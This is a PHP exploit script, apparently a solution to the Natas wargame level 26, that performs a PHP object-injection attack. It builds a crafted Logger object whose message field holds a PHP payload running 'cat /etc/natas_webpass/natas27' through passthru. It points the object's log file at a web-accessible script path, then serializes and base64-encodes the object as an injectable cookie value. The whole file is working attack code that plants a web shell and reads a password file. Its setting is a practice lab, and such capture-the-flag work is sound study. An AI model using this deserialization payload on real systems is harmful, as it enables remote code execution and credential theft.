<?php

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#";
            $this->exitMsg="<?php echo (passthru('cat /etc/natas_webpass/natas27'));echo '<------password'; ?>";
            $this->logFile =  $file ;
      
        }                       
      
        function log($msg){

        }                       
      
        function __destruct(){

        }                       
    }

  $logger = new Logger('/var/www/natas/natas26/img/script.php');


  $hack = array(
    0 => array(
      'x1'=> '0',
      'y1'=> '0',
      'x2'=> '300',
      'y2'=> '400',
    ),
    1 => $logger
  );

  $serialized = serialize($hack);

  echo $serialized;

  $encoded = base64_encode($serialized);

  echo $encoded;

  file_put_contents('info.txt', $encoded);


?>
